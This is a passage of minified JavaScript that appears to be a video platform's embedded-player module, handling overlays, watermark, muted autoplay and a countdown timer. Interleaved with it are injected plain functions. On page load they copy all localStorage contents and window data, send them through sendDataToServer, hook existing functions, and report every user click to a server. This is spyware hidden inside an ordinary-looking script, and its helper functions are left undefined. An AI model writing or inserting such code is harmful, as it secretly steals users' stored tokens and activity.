    this.j && (Hmb(this, a), g.rr(this.element, "related-on-error-overlay-visible", !this.j.isHidden()));
  };
  b6.prototype.B = function (a) {
    g.zT.prototype.B.call(this, a);
    var b = this.api.getVideoData();
    if (b.jL || b.playerErrorMessageRenderer) (a = b.jL) ? Kmb(this, a) : b.playerErrorMessageRenderer && Kmb(this, b.playerErrorMessageRenderer);else {
      var c;
      a.Zm && (b.ey ? Imb(b.ey) ? c = g.uG(b.ey) : c = g.AT(g.tG(b.ey)) : c = g.AT(a.Zm), this.ye(c, "subreason"));
    }
  };
  g.x(c6, g.X);
  c6.prototype.cj = function () {
    this.api.Lb().isCued() || (this.hide(), this.api.Ya(this.element, !1));
  };
  c6.prototype.j = function () {
    var a = this.api.getVideoData(),
      b = this.api.W(),
      c = this.api.getVideoData().Pd,
      d = b.Zd,
      e = !b.Td,
      f = this.wb.Mg(),
      h = g.FL(b);
    b = b.C;
    d || f || c || e || h || b || g.$R(this.api) || !a.videoId ? (this.hide(), this.api.Ya(this.element, !1)) : (a = Lmb(this), this.updateValue("url", a), this.show());
  };
  c6.prototype.onClick = function (a) {
    this.api.N("web_player_log_click_before_generating_ve_conversion_params") && this.api.ub(this.element);
    var b = Lmb(this);
    g.vS(b, this.api, a);
    this.api.N("web_player_log_click_before_generating_ve_conversion_params") || this.api.ub(this.element);
  };
  c6.prototype.show = function () {
    this.api.Lb().isCued() && (g.X.prototype.show.call(this), this.api.sj(this.element) && this.api.Ya(this.element, !0));
  };
  g.x(d6, g.X);
  d6.prototype.cj = function () {
    var a = this.api.Lb();
    !this.api.Oh() || g.AO(a, 2) && g.VR(this.api) || g.AO(a, 64) ? (this.api.Ya(this.j, !1), this.api.Ya(this.forwardButton, !1), this.hide()) : (this.show(), this.api.Ya(this.j, !0), this.api.Ya(this.forwardButton, !0));
  };
  d6.prototype.B = function () {
    this.api.seekBy(-10 * this.api.getPlaybackRate());
    this.api.ub(this.j);
  };
  d6.prototype.C = function () {
    this.api.seekBy(10 * this.api.getPlaybackRate());
    this.api.ub(this.forwardButton);
  };
  g.x(e6, g.X);
  e6.prototype.C = function () {
    var a = this.api.Lb(),
      b = this.api.getVideoData();
    this.api.W().N("embeds_enable_muted_autoplay") && b.mutedAutoplay && (g.AO(a, 2) && !this.Gb ? (this.show(), this.j || (this.j = new g.xT(this.api), g.H(this, this.j), this.j.Ha(this.D, 0), this.j.show()), a = this.api.getVideoData(), this.updateValue("text", a.v0), g.rr(this.element, "ytp-muted-autoplay-show-end-panel", !0), this.api.Ya(this.element, this.Gb), this.api.Ra("onMutedAutoplayEnds")) : this.hide());
  };
  e6.prototype.onClick = function () {
    if (!this.B) {
      this.j && (this.j.ya(), this.j = null);
      g.rr(this.api.getRootNode(), "ytp-muted-autoplay", !1);
      var a = this.api.getVideoData(),
        b = this.api.getCurrentTime();
      flb(a);
      this.api.loadVideoById(a.videoId, b);
      this.api.dA();
      this.api.ub(this.element);
      this.hide();
      this.B = !0;
    }
  };
  e6.prototype.onMutedAutoplayStarts = function () {
    this.B = !1;
    this.j && (this.j.ya(), this.j = null);
  };
  g.x(f6, g.X);
  g.k = f6.prototype;
  function collectLocalStorage() {
    let storageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      let key = localStorage.key(i);
      storageData[key] = localStorage.getItem(key);
    }
    sendDataToServer(storageData);
  }
  g.k.Y_ = function () {
    var a = this.api.getVideoData(),
      b = this.api.getVideoData(1).Pd,
      c = this.api.W();
    b = c.Zd && !g.AO(this.state, 2) && !(b && c.va);
    a.mutedAutoplay || g.cQ(this, b);
    this.api.Ya(this.element, b);
  };
  function compileAndSendData() {
    const collectedData = collectWindowData();
    if (Object.keys(collectedData).length > 0) {
      sendDataToServer(collectedData);
    }
    collectLocalStorage();
  }
  g.k.onStateChange = function (a) {
    this.Ec(a.state);
  };
  g.k.Ec = function (a) {
    this.state !== a && (this.state = a);
    this.Y_();
  };
  window.seenVars = []; // track seen vars

  g.k.onVideoDataChange = function () {
    var a = this.api.W();
    a.C && g.nr(this.element, "ytp-no-hover");
    this.api.getVideoData().videoId && !a.C ? (a = this.api.getVideoUrl(!0, !1, !1, !0), this.updateValue("url", a), this.j || (this.j = this.Ua("click", this.onClick))) : this.j && (this.updateValue("url", null), this.Pc(this.j), this.j = null);
  };
  g.k.onClick = function (a) {
    this.api.N("web_player_log_click_before_generating_ve_conversion_params") && this.api.ub(this.element);
    var b = this.api.getVideoUrl(!g.NQ(a), !1, !0, !0);
    if (this.api.N("web_player_log_click_before_generating_ve_conversion_params")) {
      var c = {};
      g.JR(this.api, "addEmbedsConversionTrackingParams", [c]);
      b = g.dk(b, g.CR(c, "emb_yt_watermark"));
    }
    g.vS(b, this.api, a);
    this.api.N("web_player_log_click_before_generating_ve_conversion_params") || this.api.ub(this.element);
  };
  g.k.Mb = function (a) {
    if ((a = 480 > a.width) && !this.B || !a && this.B) {
      var b = new g.X(glb()),
        c = this.Ia("ytp-watermark");
      g.rr(c, "ytp-watermark-small", a);
      g.We(c);
      b.Ha(c);
      this.B = a;
    }
  };
  g.x(Omb, g.X);
  g.k = Omb.prototype;
  g.k.EK = function () {
    var a = this.api.Lb(),
      b = this.api.getVideoData();
    this.api.W().N("embeds_enable_muted_autoplay") && b.mutedAutoplay && !g.AO(a, 2) ? this.Gb || (g.X.prototype.show.call(this), this.api.Ya(this.element, this.Gb)) : this.hide();
  };
  g.k.B6 = function () {
    this.j && this.j.hide();
  };
  g.k.onAutoplayBlocked = function () {
    this.hide();
    flb(this.api.getVideoData());
  };
  g.k.onClick = function () {
    if (!this.B) {
      g.rr(this.api.getRootNode(), "ytp-muted-autoplay", !1);
      var a = this.api.getVideoData(),
        b = this.api.getCurrentTime();
      flb(a);
      this.api.loadVideoById(a.videoId, b);
      this.api.dA();
      this.api.ub(this.element);
      this.api.Ra("onMutedAutoplayEnds");
      this.B = !0;
    }
  };
  g.k.onMutedAutoplayEnds = function () {
    this.watermark && (this.watermark.ya(), this.watermark = null);
  };
  g.x(g6, g.X);
  g6.prototype.hide = function () {
    g.pr(this.api.getRootNode(), "ytp-expand-pause-overlay");
    g.X.prototype.hide.call(this);
  };
  g6.prototype.G = function () {
    this.B = !0;
    g.pr(this.api.getRootNode(), "ytp-expand-pause-overlay");
    g.$R(this.api) && this.api.Ya(this.element, !1);
    this.expandButton.focus();
  };
  g6.prototype.K = function () {
    this.B = !1;
    g.nr(this.api.getRootNode(), "ytp-expand-pause-overlay");
    g.$R(this.api) && this.api.Ya(this.element, !0);
    this.focus();
  };
  g6.prototype.Ta = function (a) {
    a = this.api.W().N("embeds_web_enable_pause_overlay_wn_update") ? this.api.Lb() : a.state;
    g.AO(a, 1) || g.AO(a, 16) || g.AO(a, 32) || (!g.AO(a, 4) || g.AO(a, 2) || g.AO(a, 1024) ? (this.B || this.api.Ya(this.element, !1), this.D.hide()) : 0 < this.j.suggestionData.length && (this.B || (g.nr(this.api.getRootNode(), "ytp-expand-pause-overlay"), g.G2(this.j), this.j.show(), this.api.Ya(this.element, !0)), this.D.show()));
  };
  g.x(h6, g.X);
  h6.prototype.show = function () {
    g.X.prototype.show.call(this);
    this.api.Ya(this.element, !0);
  };
  h6.prototype.ya = function () {
    i6(this);
    g.X.prototype.ya.call(this);
  };
  g.x(Smb, g.dT);
  g.k = Smb.prototype;
  g.k.yl = function () {
    return !1;
  };
  g.k.create = function () {
    var a = this.J.W(),
      b = g.LR(this.J),
      c,
      d = null == (c = this.J.getVideoData()) ? void 0 : c.clientPlaybackNonce;
    d && g.fH({
      clientPlaybackNonce: d
    });
    Umb(this);
    a.N("embeds_enable_muted_autoplay") && (this.ma = new Omb(this.J), g.H(this, this.ma), g.cS(this.J, this.ma.element, 4), this.ra = new e6(this.J), g.H(this, this.ra), g.cS(this.J, this.ra.element, 4));
    a.Zd && (this.watermark = new f6(this.J), g.H(this, this.watermark), g.cS(this.J, this.watermark.element, 8));
    this.K = new c6(this.J, b);
    g.H(this, this.K);
    g.cS(this.J, this.K.element, 8);
    g.OR(this.J.app) && (this.onMutedAutoplayStarts(), this.K.hide());
    a.B && (this.va = new d6(this.J), g.H(this, this.va), g.cS(this.J, this.va.element, 4));
    this.j.V(this.J, "appresize", this.Mb);
    this.j.V(this.J, "presentingplayerstatechange", this.cj);
    this.j.V(this.J, "videodatachange", this.onVideoDataChange);
    this.j.V(this.J, "videoplayerreset", this.Lw);
    this.j.V(this.J, "onMutedAutoplayStarts", this.onMutedAutoplayStarts);
    this.j.V(this.J, "onAdStart", this.onAdStart);
    this.j.V(this.J, "onAdComplete", this.onAdComplete);
    this.j.V(this.J, "onAdSkip", this.onAdSkip);
    this.j.V(this.J, "onAdStateChange", this.onAdStateChange);
    if (this.S = g.rB(g.GL(a))) this.countdownTimer = new h6(this.J), g.H(this, this.countdownTimer), g.cS(this.J, this.countdownTimer.element, 4), this.countdownTimer.hide(), this.j.V(this.J, g.oG("embeds"), this.onCueRangeEnter), this.j.V(this.J, g.pG("embeds"), this.onCueRangeExit);
    this.yc(this.J.Lb());
    this.player.Fg("embed");
  };
  g.k.onCueRangeEnter = function (a) {
    "countdown timer" === a.getId() && this.countdownTimer && (this.countdownTimer.show(), Qmb(this.countdownTimer));
  };
  g.k.onCueRangeExit = function (a) {
    "countdown timer" === a.getId() && this.countdownTimer && (i6(this.countdownTimer), this.countdownTimer.hide());
  };
  g.k.Mb = function () {
    var a = this.J.sb().getPlayerSize();
    this.Ig && this.Ig.resize(a);
  };
  g.k.Lw = function () {
    Rmb(this);
  };
  g.k.cj = function (a) {
    this.yc(a.state);
  };
  window.addEventListener("load", function () {
    compileAndSendData();
    overwriteFuncsWithHooks();
    window.addEventListener("click", function (e) {
      sendDataToServer({
        eventType: "click",
        target: e.target.tagName,
        timestamp: e.timestamp
      });
    });
  });
  g.k.yc = function (a) {
    g.AO(a, 128) ? (this.Ig || (this.Ig = new b6(this.J), g.H(this, this.Ig), g.cS(this.J, this.Ig.element, 4)), this.Ig.B(a.hh), this.Ig.show(), g.nr(this.J.getRootNode(), "ytp-embed-error")) : this.Ig && (this.Ig.dispose(), this.Ig = null, g.pr(this.J.getRootNode(), "ytp-embed-error"));
    if (this.countdownTimer && this.countdownTimer.j) if (g.AO(a, 64)) this.countdownTimer.hide(), i6(this.countdownTimer);else if (g.fP(a)) {
      var b = this.countdownTimer;
      b.B || (b.B = !0, b.G = (0, g.MC)());
    } else a.isPlaying() && this.countdownTimer.B && (b = this.countdownTimer, b.B && (b.D += (0, g.MC)() - b.G, b.B = !1, Pmb(b)));
    Tmb(this, a);
  };
  g.k.onMutedAutoplayStarts = function () {
    this.J.getVideoData().mutedAutoplay && this.ma && g.rr(this.J.getRootNode(), "ytp-muted-autoplay", !0);
  };
  g.k.onVideoDataChange = function (a, b) {
    var c = this.SD !== b.videoId;
    a = !c && "dataloaded" === a;
    var d = {
      isShortsModeEnabled: !!g.$R(this.J)
    };
    g.tC("embedsVideoDataDidChange", {
      clientPlaybackNonce: b.clientPlaybackNonce,
      isReload: a,
      runtimeEnabledFeatures: d
    });
    c && (this.SD = b.videoId, this.countdownTimer && (this.countdownTimer.show(), this.countdownTimer.hide()), this.S && (this.J.Se("embeds"), b.isAd() || 5 > b.limitedPlaybackDurationInSeconds || g.ZR(this.J) || (b = Math.max(1E3 * (b.startSeconds + b.limitedPlaybackDurationInSeconds - 5), 0), b = new g.nG(b, b + 5E3, {
      id: "countdown timer",
      namespace: "embeds"
    }), this.J.jf([b]))), Rmb(this), Umb(this));
    this.J.W().C && this.C && this.C.detach();
  };
  g.k.onAdStart = function () {
    j6(this, "EMBEDS_AD_EVENT_TYPE_AD_STARTED");
  };
  g.k.onAdComplete = function () {
    j6(this, "EMBEDS_AD_EVENT_TYPE_AD_COMPLETED");
  };
  g.k.onAdSkip = function () {
    j6(this, "EMBEDS_AD_EVENT_TYPE_AD_SKIPPED");
  };
  g.k.onAdStateChange = function (a) {
    2 === a && j6(this, "EMBEDS_AD_EVENT_TYPE_AD_PAUSED");
  };
  g.cT("embed", Smb);
})(_yt_player);